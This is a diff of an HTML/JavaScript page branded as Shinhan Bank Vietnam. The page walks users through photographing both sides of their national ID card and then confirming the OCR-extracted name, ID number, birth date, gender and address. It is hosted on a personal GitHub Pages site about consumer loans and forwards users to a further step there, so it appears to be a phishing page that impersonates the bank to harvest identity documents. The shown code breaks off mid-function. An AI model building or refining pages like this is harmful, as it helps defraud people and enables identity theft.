@@ -9,512 +9,60 @@
     <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="icon" href="https://shinhan.com.vn/favicon.ico">
     <style>
-        /* ==========================================================================
-           1. Global Variables & Base Styles
-           ========================================================================== */
         :root {
-            --primary-color: #0072CE; /* Shinhan Official Blue */
-            --secondary-color: #F5F7FA;
-            --accent-color: #00A859; /* Green for success */
-            --error-color: #E63946;
-            --text-color: #333;
-            --text-light: #6c757d;
-            --border-color: #DEE2E6;
-            --border-radius: 8px;
-            --shadow: 0 4px 15px rgba(0, 0, 0, 0.07);
+            --primary-color: #0072CE; --secondary-color: #F5F7FA; --accent-color: #00A859;
+            --error-color: #E63946; --text-color: #333; --text-light: #6c757d;
+            --border-color: #DEE2E6; --border-radius: 8px; --shadow: 0 4px 15px rgba(0, 0, 0, 0.07);
             --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
         }
-
-        body {
-            font-family: 'Be Vietnam Pro', sans-serif;
-            background-color: var(--secondary-color);
-            color: var(--text-color);
-            line-height: 1.6;
-            margin: 0;
-            padding: 0;
-            overflow-x: hidden;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-        
-        /* ==========================================================================
-           2. Header & Progress Bar
-           ========================================================================== */
-        .app-header {
-            background: #fff;
-            padding: 15px 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            text-align: center;
-            margin-bottom: 20px;
-            position: sticky;
-            top: 0;
-            z-index: 1010;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .app-header img {
-            height: 30px;
-            max-width: 150px;
-        }
-        
-        .back-button {
-            position: absolute;
-            left: 20px;
-            font-size: 1.5rem;
-            color: var(--text-color);
-            cursor: pointer;
-        }
-        
-        .progress-bar-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            max-width: 400px;
-            margin: 20px auto;
-            position: relative;
-        }
-
-        .progress-bar-line {
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background-color: var(--border-color);
-            transform: translateY(-50%);
-            z-index: 1;
-        }
-        
-        .progress-bar-fill {
-            position: absolute;
-            top: 0;
-            left: 0;
-            height: 100%;
-            width: 0%; /* JS will update this */
-            background-color: var(--primary-color);
-            transition: width 0.4s ease-in-out;
-        }
-
-        .progress-step {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            z-index: 2;
-            position: relative;
-        }
-
-        .step-circle {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            background-color: #fff;
-            border: 2px solid var(--border-color);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 600;
-            color: var(--text-light);
-            transition: var(--transition);
-        }
-
-        .step-label {
-            font-size: 0.8rem;
-            color: var(--text-light);
-            margin-top: 8px;
-            transition: var(--transition);
-        }
-
-        /* Step States */
-        .progress-step.active .step-circle {
-            border-color: var(--primary-color);
-            background-color: var(--primary-color);
-            color: #fff;
-        }
-        .progress-step.active .step-label {
-            color: var(--primary-color);
-            font-weight: 600;
-        }
-        
-        .progress-step.completed .step-circle {
-            border-color: var(--accent-color);
-            background-color: var(--accent-color);
-            color: #fff;
-        }
-        .progress-step.completed .step-label {
-            color: var(--text-color);
-        }
-
-        /* ==========================================================================
-           3. Main Content & Sections
-           ========================================================================== */
-        .content-card {
-            background: white;
-            padding: clamp(20px, 5vw, 40px);
-            border-radius: var(--border-radius);
-            box-shadow: var(--shadow);
-            margin: 20px auto 120px;
-            max-width: 600px;
-        }
-
-        .guide-box {
-            text-align: center;
-            padding: 10px;
-        }
-
-        .guide-box h3 {
-            color: var(--text-color);
-            font-weight: 700;
-            margin-bottom: 20px;
-        }
-
-        .guide-examples {
-            display: flex;
-            gap: 20px;
-            justify-content: center;
-            margin-bottom: 30px;
-        }
-        .guide-example {
-            width: 120px;
-        }
-        .guide-example img {
-            width: 100%;
-            height: 75px;
-            border-radius: 8px;
-            border: 2px solid;
-            object-fit: cover;
-        }
-        .guide-example p {
-            margin-top: 10px;
-            font-weight: 600;
-        }
-        .guide-example.correct img { border-color: var(--accent-color); }
-        .guide-example.correct p { color: var(--accent-color); }
-        .guide-example.incorrect img { border-color: var(--error-color); }
-        .guide-example.incorrect p { color: var(--error-color); }
-        
-        .guide-box ul {
-            list-style: none;
-            padding: 0;
-            text-align: left;
-            max-width: 450px;
-            margin: 0 auto 30px auto;
-        }
-
-        .guide-box li {
-            margin: 15px 0;
-            display: flex;
-            align-items: center;
-            font-size: 1rem;
-        }
-
-        .guide-box li i {
-            color: var(--primary-color);
-            margin-right: 15px;
-            width: 24px;
-            text-align: center;
-            font-size: 1.2rem;
-        }
-
-        /* ==========================================================================
-           4. Capture UI
-           ========================================================================== */
-        .capture-box, .confirm-box {
-            text-align: center;
-            min-height: 400px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-        }
-        
-        .capture-box .instruction-text, .confirm-box .instruction-text {
-            color: var(--text-light);
-            margin-bottom: 20px;
-        }
-        
-        .confirm-previews {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-            margin: 20px 0;
-        }
-        .confirm-previews img {
-            width: 100%;
-            max-width: 300px;
-            border-radius: 8px;
-            margin: 0 auto;
-            box-shadow: var(--shadow);
-        }
-
-        .camera-frame {
-            position: relative;
-            width: 100%;
-            max-width: 480px;
-            aspect-ratio: 1.586 / 1; /* Tỷ lệ thẻ CCCD */
-            margin: 15px auto;
-            border-radius: var(--border-radius);
-            overflow: hidden;
-            background: #000;
-        }
-        
-        .camera-frame::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            border: 2px solid rgba(255,255,255,0.7);
-            border-radius: var(--border-radius);
-            animation: scan-glow 2s infinite alternate;
-        }
-        
-        @keyframes scan-glow {
-            from { box-shadow: 0 0 5px rgba(255,255,255,0.4); }
-            to { box-shadow: 0 0 15px rgba(255,255,255,0.8); }
-        }
-
-        .camera-frame video {
-            display: none; 
-        }
-
-        .camera-frame canvas {
-            width: 100%;
-            height: 100%;
-            display: block;
-            background-color: #000;
-        }
-
-        .camera-frame .overlay-focus {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1;
-        }
-
-        .camera-frame .overlay-focus .id-card-outline {
-            width: 85%;
-            aspect-ratio: 1.586 / 1;
-            border: 2px dashed rgba(255, 255, 255, 0.6);
-            border-radius: 8px;
-            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.6);
-            transition: all 0.3s ease;
-        }
-        
-        .camera-frame.ready-to-capture .overlay-focus .id-card-outline {
-            border: 2px dashed var(--accent-color);
-            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.4);
-        }
-        
-        .camera-frame.blink-once {
-            animation: blink 0.5s 1;
-        }
-        @keyframes blink {
-            50% { box-shadow: 0 0 20px var(--primary-color); }
-        }
-
-        /* ==========================================================================
-           5. UI Elements
-           ========================================================================== */
-        .status-message, .error-message {
-            font-size: 0.9rem;
-            margin: 15px auto 5px auto;
-            max-width: 480px;
-            padding: 10px;
-            border-radius: var(--border-radius);
-            font-weight: 500;
-        }
-        
-        .status-message {
-             height: 40px;
-             line-height: 20px;
-             color: var(--primary-color);
-        }
-
-        .error-message {
-            background-color: #FFF2F2;
-            color: var(--error-color);
-            border: 1px solid var(--error-color);
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        .error-message.visible {
-            opacity: 1;
-        }
-
-        .loader {
-            width: 48px;
-            height: 48px;
-            border: 5px solid var(--secondary-color);
-            border-top: 5px solid var(--primary-color);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 50px auto;
-        }
-        @keyframes spin {
-            100% { transform: rotate(360deg); }
-        }
-
-        .fixed-bottom-bar {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            padding: 15px;
-            box-shadow: 0 -4px 15px rgba(0,0,0,0.07);
-            z-index: 1000;
-            padding-bottom: calc(15px + env(safe-area-inset-bottom));
-        }
-        
-        .button-group {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-            margin-top: 1rem;
-        }
-
-        .btn {
-            border-radius: var(--border-radius);
-            padding: 12px 28px;
-            font-weight: 600;
-            transition: var(--transition);
-            border: 1px solid transparent;
-            font-size: 1rem;
-        }
-        
-        .btn-primary {
-            background-color: var(--primary-color);
-            color: white;
-        }
-        .btn-primary:hover {
-            background-color: #005a9e;
-            transform: translateY(-2px);
-            color: white;
-        }
-        .btn-primary:disabled {
-            background-color: #a0c2e0;
-            border-color: #a0c2e0;
-        }
-        
-        .btn-secondary {
-            background-color: #E9ECEF;
-            color: var(--text-color);
-            border-color: #E9ECEF;
-        }
-        .btn-secondary:hover {
-            background-color: #d8dde1;
-            border-color: #d8dde1;
-        }
-
-        .btn .spinner-border {
-            width: 1rem;
-            height: 1rem;
-            vertical-align: middle;
-            margin-right: 0.5rem;
-            display: none;
-        }
-        .btn.is-loading {
-            pointer-events: none;
-            opacity: 0.8;
-        }
-        .btn.is-loading .spinner-border {
-            display: inline-block;
-        }
-
-        /* ==========================================================================
-           6. State-driven UI Management
-           ========================================================================== */
-        #captureSection .cameraView,
-        #captureSection .loader,
-        #captureSection .manualCaptureBtn,
-        #captureSection .recaptureBtn,
-        #captureSection .nextStepBtn,
-        #captureSection .error-message {
-            display: none;
-        }
-        #captureSection .error-message {
-            opacity: 0;
-        }
-        #captureSection[data-state="capturing"] .cameraView,
-        #captureSection[data-state="capturing"] .manualCaptureBtn {
-            display: inline-flex;
-            align-items: center;
-        }
-        #captureSection[data-state="loading"] .loader {
-            display: block;
-        }
-        #captureSection[data-state="success"] .recaptureBtn,
-        #captureSection.capture-type-front[data-state="success"] .nextStepBtn {
-             display: inline-flex;
-             align-items: center;
-        }
-        #captureSection[data-state="error"] .cameraView,
-        #captureSection[data-state="error"] .manualCaptureBtn,
-        #captureSection[data-state="error"] .recaptureBtn {
-             display: inline-flex;
-             align-items: center;
-        }
-        #captureSection[data-state="error"] .error-message {
-             display: block;
-        }
-
-        /* ==========================================================================
-           7. Semantic Info Display
-           ========================================================================== */
-        .info-group {
-            margin-top: 25px;
-            text-align: left;
-            border: 1px solid var(--border-color);
-            border-radius: var(--border-radius);
-            padding: 15px;
-            background-color: var(--secondary-color);
-        }
-        .info-item {
-            display: flex;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-        .info-item:last-child {
-            margin-bottom: 0;
-        }
-        .info-label { /* dt */
-            font-weight: 600;
-            color: var(--text-light);
-            flex: 0 0 100px; /* Fixed width for label */
-            margin-right: 10px;
-        }
-        .info-value { /* dd */
-            flex-grow: 1;
-            padding: 8px 10px;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            background-color: white;
-            color: var(--text-color);
-            min-height: 40px;
-            display: flex;
-            align-items: center;
-        }
-        .info-value[contenteditable="true"] {
-            background-color: #FFF;
-            border-color: var(--primary-color);
-            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
-            outline: none;
-        }
-        .info-value:empty:before {
-            content: attr(data-placeholder);
-            color: var(--text-light);
-            font-style: italic;
-        }
+        body { font-family: 'Be Vietnam Pro', sans-serif; background-color: var(--secondary-color); color: var(--text-color); line-height: 1.6; margin: 0; padding: 0; overflow-x: hidden; }
+        .hidden { display: none !important; }
+        .app-header { background: #fff; padding: 15px 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); text-align: center; margin-bottom: 20px; position: sticky; top: 0; z-index: 1010; display: flex; align-items: center; justify-content: center; }
+        .app-header img { height: 30px; max-width: 150px; }
+        .back-button { position: absolute; left: 20px; font-size: 1.5rem; color: var(--text-color); cursor: pointer; }
+        .progress-bar-container { display: flex; justify-content: space-between; align-items: center; max-width: 400px; margin: 20px auto; position: relative; }
+        .progress-bar-line { position: absolute; top: 50%; left: 0; right: 0; height: 2px; background-color: var(--border-color); transform: translateY(-50%); z-index: 1; }
+        .progress-bar-fill { position: absolute; top: 0; left: 0; height: 100%; width: 0%; background-color: var(--primary-color); transition: width 0.4s ease-in-out; }
+        .progress-step { display: flex; flex-direction: column; align-items: center; z-index: 2; position: relative; }
+        .step-circle { width: 30px; height: 30px; border-radius: 50%; background-color: #fff; border: 2px solid var(--border-color); display: flex; align-items: center; justify-content: center; font-weight: 600; color: var(--text-light); transition: var(--transition); }
+        .step-label { font-size: 0.8rem; color: var(--text-light); margin-top: 8px; transition: var(--transition); }
+        .progress-step.active .step-circle { border-color: var(--primary-color); background-color: var(--primary-color); color: #fff; }
+        .progress-step.active .step-label { color: var(--primary-color); font-weight: 600; }
+        .progress-step.completed .step-circle { border-color: var(--accent-color); background-color: var(--accent-color); color: #fff; }
+        .content-card { background: white; padding: clamp(20px, 5vw, 40px); border-radius: var(--border-radius); box-shadow: var(--shadow); margin: 20px auto 120px; max-width: 600px; }
+        #guideSection ul li { margin: 15px 0; display: flex; align-items: center; font-size: 1rem; }
+        .camera-frame { position: relative; width: 100%; max-width: 480px; aspect-ratio: 1.586 / 1; margin: 15px auto; border-radius: var(--border-radius); overflow: hidden; background: #000; }
+        .camera-frame video { display: none; }
+        .camera-frame canvas { width: 100%; height: 100%; display: block; }
+        .error-message { background-color: #FFF2F2; color: var(--error-color); border: 1px solid var(--border-color); opacity: 0; transition: opacity 0.3s ease; padding: 10px; border-radius: var(--border-radius); margin-top: 1rem; font-weight: 500; min-height: 1.5rem; }
+        .error-message.visible { opacity: 1; border-color: var(--error-color); }
+        .field-error { background-color: #FFF2F2; color: var(--error-color); border: 1px solid var(--error-color); padding: 5px 8px; border-radius: var(--border-radius); margin: 5px 0 0 120px; font-size: 0.8rem; min-height: 1.2rem; opacity: 0; transition: opacity 0.3s ease; }
+        .field-error:not(:empty) { opacity: 1; }
+        .loader { width: 48px; height: 48px; border: 5px solid var(--secondary-color); border-top: 5px solid var(--primary-color); border-radius: 50%; animation: spin 1s linear infinite; margin: 50px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .btn { border-radius: var(--border-radius); padding: 12px 28px; font-weight: 600; transition: var(--transition); border: 1px solid transparent; }
+        .btn .spinner-border { width: 1rem; height: 1rem; vertical-align: middle; margin-right: 0.5rem; display: none; }
+        .btn.is-loading .spinner-border { display: inline-block; }
+        .btn:disabled { cursor: not-allowed; opacity: 0.65; }
+        .btn-primary { background-color: var(--primary-color); border-color: var(--primary-color); color: white; }
+        .btn-primary:hover:not(:disabled) { background-color: #005a9e; border-color: #005a9e; }
+        .btn-secondary { background-color: #e9ecef; border-color: #e9ecef; color: var(--text-color); }
+        .btn-secondary:hover:not(:disabled) { background-color: #d8dde1; border-color: #d8dde1; }
+        .camera-frame.blink-once { animation: blink 0.5s 1; }
+        @keyframes blink { 50% { box-shadow: 0 0 20px var(--primary-color); } }
+        .status-message { font-size: 0.9rem; color: var(--primary-color); margin: 1rem 0; min-height: 1.5rem; text-align: center; }
+        .info-group { margin: 20px 0; padding: 15px; border: 1px solid var(--border-color); border-radius: var(--border-radius); background-color: var(--secondary-color); }
+        .info-item { display: flex; flex-wrap: wrap; align-items: center; margin-bottom: 10px; }
+        .info-item:last-of-type { margin-bottom: 0; }
+        .info-label { font-weight: 600; width: 120px; color: var(--text-light); flex-shrink: 0; }
+        .info-value { flex: 1; padding: 8px; border: 1px solid var(--border-color); border-radius: var(--border-radius); background: white; min-width: 150px; }
+        .info-value[contenteditable="true"]:focus { outline: none; border-color: var(--primary-color); box-shadow: 0 0 0 2px rgba(0, 114, 206, 0.2); }
+        #captureSection .cameraView, #captureSection .loader, #captureSection .manualCaptureBtn, #captureSection .recaptureBtn, #captureSection .nextStepBtn { display: none; }
+        #captureSection[data-state="capture_streaming"] .cameraView { display: block; }
+        #captureSection[data-state="capture_streaming"] .manualCaptureBtn { display: inline-flex; }
+        #captureSection[data-state="capture_review"] .cameraView { display: block; }
+        #captureSection[data-state="capture_review"] .recaptureBtn, #captureSection[data-state="capture_review"] .nextStepBtn { display: inline-flex; }
+        #captureSection[data-state="loading"] .loader { display: block; }
     </style>
 </head>
 <body>
@@ -522,578 +70,316 @@
         <i id="backButton" class="fas fa-arrow-left back-button hidden"></i>
         <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo.png" alt="Shinhan Bank Logo">
     </header>
-
     <main class="container">
         <div class="progress-bar-container">
-            <div class="progress-bar-line">
-                <div id="progressBarFill" class="progress-bar-fill"></div>
-            </div>
-            <div id="step1" class="progress-step">
-                <div class="step-circle">1</div>
-                <div class="step-label">Mặt trước</div>
-            </div>
-            <div id="step2" class="progress-step">
-                <div class="step-circle">2</div>
-                <div class="step-label">Mặt sau</div>
-            </div>
+            <div class="progress-bar-line"><div id="progressBarFill" class="progress-bar-fill"></div></div>
+            <div id="step1" class="progress-step"><div class="step-circle">1</div><div class="step-label">Mặt trước</div></div>
+            <div id="step2" class="progress-step"><div class="step-circle">2</div><div class="step-label">Mặt sau</div></div>
         </div>
-
         <div class="content-card">
             <div id="guideSection">
-                <div class="guide-box">
+                <div style="text-align: center; padding: 10px;">
                     <h3>Xác thực Giấy tờ tùy thân</h3>
-                    <div class="guide-examples">
-                        <div class="guide-example correct">
-                            <img src="https://i.imgur.com/q7PIttQ.jpeg" alt="Mẫu mặt trước">
-                            <p>Mặt trước</p>
-                        </div>
-                        <div class="guide-example correct">
-                             <img src="https://i.imgur.com/mzBQ9t4.jpeg" alt="Mẫu mặt sau">
-                            <p>Mặt sau</p>
-                        </div>
-                    </div>
-                    <ul>
-                        <li><i class="fas fa-image"></i> Đặt CCCD trên một mặt phẳng, màu tối.</li>
-                        <li><i class="fas fa-lightbulb"></i> Đảm bảo môi trường đủ sáng, không bị lóa.</li>
-                        <li><i class="fas fa-crop-alt"></i> Canh chỉnh toàn bộ giấy tờ nằm gọn trong khung hình.</li>
-                        <li><i class="fas fa-mobile-alt"></i> Giữ điện thoại ổn định để ảnh không bị mờ.</li>
+                    <ul style="list-style: none; padding: 0; text-align: left; max-width: 450px; margin: 30px auto;">
+                        <li><i class="fas fa-mobile-alt" style="color: var(--primary-color); margin-right: 15px; width: 24px; text-align: center;"></i> Ưu tiên sử dụng camera sau của điện thoại.</li>
+                        <li><i class="fas fa-image" style="color: var(--primary-color); margin-right: 15px; width: 24px; text-align: center;"></i> Đặt CCCD trên một mặt phẳng, màu tối.</li>
+                        <li><i class="fas fa-lightbulb" style="color: var(--primary-color); margin-right: 15px; width: 24px; text-align: center;"></i> Đảm bảo môi trường đủ sáng, không lóa.</li>
                     </ul>
+                    <p id="mainErrorMessage" class="error-message" role="alert" aria-live="assertive"></p>
+                    <div class="button-group"><button id="startCaptureBtn" class="btn btn-primary">Bắt đầu chụp</button></div>
+                </div>
+            </div>
+            <div id="captureSection" class="hidden">
+                <div style="text-align: center;"> <h3 id="captureTitle"></h3><p id="captureInstruction" style="color: var(--text-light);"></p></div>
+                <div id="cameraView" class="camera-frame"><video id="cameraVideo" autoplay playsinline></video><canvas id="cameraCanvasPreview"></canvas></div>
+                <div id="loader" class="loader"></div>
+                <div>
+                    <p id="statusMessage" class="status-message" aria-live="polite"></p>
                     <div class="button-group">
-                        <button id="startCaptureBtn" class="btn btn-primary">Bắt đầu chụp</button>
+                        <button id="manualCaptureBtn" class="btn btn-secondary"><i class="fas fa-camera"></i> Chụp ảnh</button>
+                        <button id="recaptureBtn" class="btn btn-secondary"><i class="fas fa-redo"></i> Chụp lại</button>
+                        <button id="nextStepBtn" class="btn btn-primary">Tiếp tục</button>
                     </div>
                 </div>
             </div>
-
-            <div id="captureSection" class="hidden" data-state="capturing">
-                <div class="capture-box">
-                    <div> <h3 id="captureTitle"></h3>
-                        <p id="captureInstruction" class="instruction-text"></p>
-                    </div>
-                    
-                    <div id="cameraView" class="cameraView">
-                        <div class="camera-frame" id="cameraFrame">
-                            <video id="cameraVideo" autoplay playsinline class="hidden"></video>
-                            <canvas id="cameraCanvasPreview"></canvas>
-                            <div class="overlay-focus">
-                                <div class="id-card-outline"></div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div id="loader" class="loader" role="status" aria-label="Đang xử lý"></div>
-                    
-                    <div> <p id="statusMessage" class="status-message" aria-live="polite"></p>
-                        <p id="errorMessage" class="error-message" aria-live="assertive"></p>
-
-                        <div class="button-group">
-                            <button id="manualCaptureBtn" class="btn btn-secondary"><i class="fas fa-camera"></i> Chụp ảnh</button>
-                            <button id="recaptureBtn" class="btn btn-secondary"><i class="fas fa-redo"></i> Chụp lại</button>
-                            <button id="nextStepBtn" class="btn btn-primary">Tiếp tục: Chụp mặt sau</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
             <div id="confirmSection" class="hidden">
-                <div class="confirm-box">
-                     <div>
-                        <h3>Xác nhận thông tin</h3>
-                        <p class="instruction-text">Vui lòng kiểm tra lại hình ảnh và thông tin đã trích xuất.</p>
-                     </div>
-                    <div class="confirm-previews">
-                        <img id="frontPreview" alt="Ảnh xem trước mặt trước">
-                        <img id="backPreview" alt="Ảnh xem trước mặt sau">
-                    </div>
-
-                    <dl class="info-group">
-                        <div class="info-item">
-                            <dt class="info-label">Số CCCD:</dt>
-                            <dd id="ocrCccdNumber" class="info-value" contenteditable="true" data-placeholder="Nhập số CCCD" role="textbox" aria-label="Số Căn cước công dân"></dd>
-                        </div>
-                        <div class="info-item">
-                            <dt class="info-label">Họ và tên:</dt>
-                            <dd id="ocrFullName" class="info-value" contenteditable="true" data-placeholder="Nhập họ và tên" role="textbox" aria-label="Họ và tên"></dd>
-                        </div>
-                        <div class="info-item">
-                            <dt class="info-label">Ngày sinh:</dt>
-                            <dd id="ocrDateOfBirth" class="info-value" contenteditable="true" data-placeholder="Nhập ngày sinh" role="textbox" aria-label="Ngày sinh"></dd>
-                        </div>
-                        <div class="info-item">
-                            <dt class="info-label">Giới tính:</dt>
-                            <dd id="ocrGender" class="info-value" contenteditable="true" data-placeholder="Nhập giới tính" role="textbox" aria-label="Giới tính"></dd>
-                        </div>
-                        <div class="info-item">
-                            <dt class="info-label">Địa chỉ:</dt>
-                            <dd id="ocrAddress" class="info-value" contenteditable="true" data-placeholder="Nhập địa chỉ" role="textbox" aria-label="Địa chỉ thường trú"></dd>
-                        </div>
-                    </dl>
-
-                    <div class="button-group">
-                        <button id="redoFrontBtn" class="btn btn-secondary">Chụp lại mặt trước</button>
-                        <button id="redoBackBtn" class="btn btn-secondary">Chụp lại mặt sau</button>
-                    </div>
-                     <div class="button-group">
-                        <button id="confirmBtn" class="btn btn-primary w-100"><span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>Xác nhận và Hoàn tất</button>
-                    </div>
+                <div><h3>Xác nhận thông tin</h3><p style="color: var(--text-light);">Vui lòng kiểm tra và chỉnh sửa (nếu cần).</p></div>
+                <div style="display: flex; flex-direction: column; gap: 20px; margin: 20px 0;">
+                    <img id="frontPreview" alt="Ảnh xem trước mặt trước của giấy tờ tùy thân" style="width: 100%; max-width: 300px; border-radius: 8px; margin: 0 auto;">
+                    <img id="backPreview" alt="Ảnh xem trước mặt sau của giấy tờ tùy thân" style="width: 100%; max-width: 300px; border-radius: 8px; margin: 0 auto;">
                 </div>
+                <dl class="info-group">
+                    <div class="info-item"><dt class="info-label">Số CCCD:</dt><dd id="ocrCccdNumber" class="info-value" contenteditable="true" role="textbox" aria-label="Số Căn cước công dân" aria-describedby="cccdError"></dd><p id="cccdError" class="field-error"></p></div>
+                    <div class="info-item"><dt class="info-label">Họ và tên:</dt><dd id="ocrFullName" class="info-value" contenteditable="true" role="textbox" aria-label="Họ và tên" aria-describedby="fullNameError"></dd><p id="fullNameError" class="field-error"></p></div>
+                    <div class="info-item"><dt class="info-label">Ngày sinh:</dt><dd id="ocrDateOfBirth" class="info-value" contenteditable="true" role="textbox" aria-label="Ngày sinh" aria-describedby="dobError"></dd><p id="dobError" class="field-error"></p></div>
+                    <div class="info-item"><dt class="info-label">Giới tính:</dt><dd id="ocrGender" class="info-value" contenteditable="true" role="textbox" aria-label="Giới tính" aria-describedby="genderError"></dd><p id="genderError" class="field-error"></p></div>
+                    <div class="info-item"><dt class="info-label">Địa chỉ:</dt><dd id="ocrAddress" class="info-value" contenteditable="true" role="textbox" aria-label="Địa chỉ"></dd></div>
+                </dl>
+                <div class="button-group"><button id="redoAllBtn" class="btn btn-secondary">Chụp lại từ đầu</button></div>
+                <div class="button-group"><button id="confirmBtn" class="btn btn-primary w-100"><span class="spinner-border spinner-border-sm"></span>Xác nhận</button></div>
             </div>
-
         </div>
     </main>
-    
-    <div id="bottomBar" class="fixed-bottom-bar hidden">
-        <button id="finalContinueBtn" class="btn btn-primary w-100" disabled>Xem lại và Hoàn tất</button>
-    </div>
 
 <script>
 "use strict";
-
 const IDCaptureApp = {
-    // Application State
     state: {
-        frontImageVerified: false,
-        backImageVerified: false,
-        frontImageDataUrl: null,
-        backImageDataUrl: null,
-        currentStream: null,
-        currentCaptureType: 'front',
-        isCapturing: false, // Quản lý trạng thái đang chụp
-        simulationAttempts: 0,
-        currentFacingMode: 'environment',
-        videoOrientation: 0,
-        
-        cameraCanvasPreview: null,
-        cameraCanvasContext: null,
-        animationFrameId: null,
-        guidanceLoopTimeoutId: null,
-        
-        extractedInfo: {
-            cccdNumber: '',
-            fullName: '',
-            dateOfBirth: '',
-            gender: '',
-            address: ''
-        }
+        isBusy: false, isPermanentError: false, appStep: 'guide', error: null,
+        captureType: 'front', imageData: { front: null, back: null },
+        stream: null, videoOrientation: 0, facingMode: 'environment',
+        animationFrameId: null, extractedInfo: null, previewImage: null,
+        boundResizeHandler: null, boundPopstateHandler: null,
     },
-
     elements: {},
-
     config: {
-        ERROR_MESSAGE_TIMEOUT: 4000,
-        NEXT_STEP_URL: 'https://vaytieudung.github.io/shinhanbank/pages/vi/step3.html',
-        mirrorFrontCamera: false
+        ERROR_MESSAGE_TIMEOUT: 5000, NEXT_STEP_URL: 'https://vaytieudung.github.io/shinhanbank/pages/vi/step3.html',
+        cameraResolution: { width: { ideal: 1280 }, height: { ideal: 720 } }
     },
+
+    setState(newState) { Object.assign(this.state, newState); requestAnimationFrame(() => this._updateUI()); },
+    logError(message, error, isPermanent = false) { console.error(`[EKYC] ${message}`, error || ''); this.setState({ isBusy: false, error: message, isPermanentError: isPermanent }); },
 
     init() {
-        this.cacheDOMElements();
+        this._cacheDOMElements(); this._addEventListeners();
         if (!('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices)) {
-             this.showPermanentError("Trình duyệt không hỗ trợ camera. Vui lòng sử dụng một trình duyệt khác.");
-             return;
+             this.logError("Trình duyệt không hỗ trợ camera.", null, true);
         }
-        this.addEventListeners();
-        console.log("Professional eKYC App initialized.");
-    },
-
-    cacheDOMElements() {
-        const ids = [
-            'guideSection', 'captureSection', 'startCaptureBtn', 'cameraView', 'cameraFrame', 'cameraVideo', 
-            'statusMessage', 'loader', 'errorMessage', 'manualCaptureBtn', 'recaptureBtn', 'nextStepBtn', 
-            'captureTitle', 'captureInstruction', 'bottomBar', 'finalContinueBtn',
-            'step1', 'step2', 'progressBarFill', 'backButton', 'confirmSection',
-            'frontPreview', 'backPreview', 'redoFrontBtn', 'redoBackBtn', 'confirmBtn',
-            'cameraCanvasPreview',
-            'ocrCccdNumber', 'ocrFullName', 'ocrDateOfBirth', 'ocrGender', 'ocrAddress'
-        ];
-        ids.forEach(id => this.elements[id] = document.getElementById(id));
-        this.state.cameraCanvasPreview = this.elements.cameraCanvasPreview;
-        this.state.cameraCanvasContext = this.state.cameraCanvasPreview.getContext('2d');
-    },
-
-    addEventListeners() {
-        this.elements.startCaptureBtn.addEventListener('click', () => this.startCaptureProcess('front'));
-        this.elements.manualCaptureBtn.addEventListener('click', () => this.triggerCapture());
-        this.elements.recaptureBtn.addEventListener('click', () => this.startCaptureProcess(this.state.currentCaptureType));
-        this.elements.nextStepBtn.addEventListener('click', () => {
-            if (this.state.currentCaptureType === 'front') {
-                this.startCaptureProcess('back');
-            }
-        });
-        this.elements.backButton.addEventListener('click', () => this.cancelCapture(true)); 
-        this.elements.finalContinueBtn.addEventListener('click', () => this.showConfirmationScreen());
-        this.elements.redoFrontBtn.addEventListener('click', () => this.retakePhoto('front'));
-        this.elements.redoBackBtn.addEventListener('click', () => this.retakePhoto('back'));
-        this.elements.confirmBtn.addEventListener('click', () => this.submitFinalData());
-
-        if ('orientation' in screen) {
-            screen.orientation.addEventListener('change', this.handleOrientationChange.bind(this));
-        }
-    },
-    
-    handleOrientationChange() {
-        if (!this.elements.captureSection.classList.contains('hidden')) {
-            this.stopCamera();
-            setTimeout(() => {
-                this.startCaptureProcess(this.state.currentCaptureType);
-            }, 200);
-        }
+        this.setState({});
     },
     
     async startCaptureProcess(type) {
-        this.state.currentCaptureType = type;
-        this.state.simulationAttempts = 0;
-        this.resetUIForCapture(type);
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { 
-                    facingMode: 'environment',
-                    width: { ideal: 1920 }, 
-                    height: { ideal: 1080 },
+        if (this.state.isBusy) return;
+        this.setState({ isBusy: true, appStep: 'capture_streaming', captureType: type, error: null });
+        let attempts = 2;
+        while (attempts--) {
+            try {
+                let stream, facingMode = 'environment';
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' }, ...this.config.cameraResolution } });
+                } catch (err) {
+                    if (err.name === "OverconstrainedError" || err.name === "NotFoundError") {
+                        console.warn("Không tìm thấy camera sau, đang thử camera trước.");
